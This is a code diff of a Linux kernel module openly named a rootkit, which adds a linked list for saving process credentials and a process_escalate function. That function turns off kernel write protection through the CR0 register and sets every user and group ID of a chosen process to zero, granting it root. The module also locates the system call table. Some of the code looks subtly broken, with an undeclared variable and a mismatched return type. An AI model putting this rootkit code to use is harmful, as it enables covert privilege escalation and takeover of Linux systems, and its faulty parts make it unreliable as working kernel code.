@@ -1,20 +1,106 @@
 #include "rootkit.h"
 
-void rootkit_exit(void) {
+/* list for saved creds */
+PID_NODE *head = NULL;
 
+/* insert node at the beginning of the current list */
+PID_NODE *insert_pid_node(PID_NODE **head, PID_NODE *new_node){
+  printk("insert_pid_node()");
+  node = new_node;
+  /* we are adding at the beginning, new head */
+  node->prev = NULL;
+  node->next = (*head); //old head
+
+  if((*head) != NULL){
+    (*head)->prev = node;
+  }
+  (*head) = node;
+
+  return node;
 }
 
-int rootkit_init(void) {
-  int retval;
 
-  /* load the parameters */
-  ///* locate the syscall table */
+PID_NODE *find_pid_node(PID_NODE **head, pid_t pid){
+  printk("find_pid_node()");
+  PID_NODE *node = *head;
 
-  retval = locate_sys_call_table();
-  if (retval == EFAULT)
-    return retval;
-  printk("We found the sys call table at %p\n", sys_call_table_addr);
-  return 0;
+  while(node != NULL) {
+    if(node->pid == pid) {
+      return node;
+    }
+    node = node->next;
+  }
+
+  return NULL;
+}
+
+/* delete node */
+void *delete_pid_node(PID_NODE **head, pid_t pid){
+  /* check for NULL */
+  printk("delete_pid_node()");
+  PID_NODE *node = find_pid_node(head, pid);
+  if(*head == NULL || node == NULL) {
+    return;
+  }
+
+  /* node to be deleted is head */
+  if(*head == node) {
+    *head = node->next; 
+  }
+
+  /* next node */
+  if(node->next != NULL)
+    node->next->prev = node->prev;  
+
+  /* prev node */
+  if(node->prev != NULL)
+    node->prev->next = node->next;      
+
+  kfree(node);
+}
+
+void process_escalate(pid_t pid){
+  printk("process_escalate()");
+  /*We have the PID we want escalated to root
+    Let us get the task struct*/
+  struct task_struct *task = pid_task(find_get_pid(pid), PIDTYPE_PID);
+  struct cred *pcred;
+  if(find_pid_node(&head, pid) == NULL){
+    /*create new pid node*/
+    PID_NODE *new_node = kmalloc(sizeof(PID_NODE), GFP_KERNEL);
+    new_node->pid = pid;
+    /*start reading*/
+    rcu_read_lock(); //lock the mutex
+    write_cr0(read_cr0() & (~0x10000)); //disable page protection
+    /* fill in the members from the task for backup*/
+    pcred = (struct cred *)task->cred;
+    new_node->uid = pcred->uid;
+    new_node->suid = pcred->suid;
+    new_node->euid = pcred->euid;
+    new_node->fsuid = pcred->fsuid;
+    new_node->gid = pcred->gid;
+    new_node->sgid = pcred->sgid;
+    new_node->egid = pcred->egid;
+    new_node->fsgid = pcred->fsgid;
+    /* escalate task */
+    pcred->uid.val = 0;
+    pcred->suid.val = 0;
+    pcred->euid.val = 0;
+    pcred->fsuid.val = 0;
+    pcred->gid.val = 0;
+    pcred->sgid.val = 0;
+    pcred->egid.val = 0;
+    pcred->fsgid.val = 0;
+    /*finish reading*/
+    rcu_read_unlock(); //lock the mutex
+    write_cr0(read_cr0() | 0x10000); //enable page protection
+    /*add pid node to LL*/
+    insert_pid_node(&head, new_node);
+    return;
+  }
+  printk("process %d already is escalated", pid);
+
+
 }
 
 /**
@@ -58,3 +144,20 @@ int locate_sys_call_table(void) {
   return 0;
 }
 
+int rootkit_init(void) {
+  int retval;
+
+  /* load the parameters */
+  ///* locate the syscall table */
+
+  retval = locate_sys_call_table();
+  if (retval == EFAULT)
+    return retval;
+  printk("We found the sys call table at %p\n", sys_call_table_addr);
+
+  return 0;
+}
+
+void rootkit_exit(void) {
+
+}
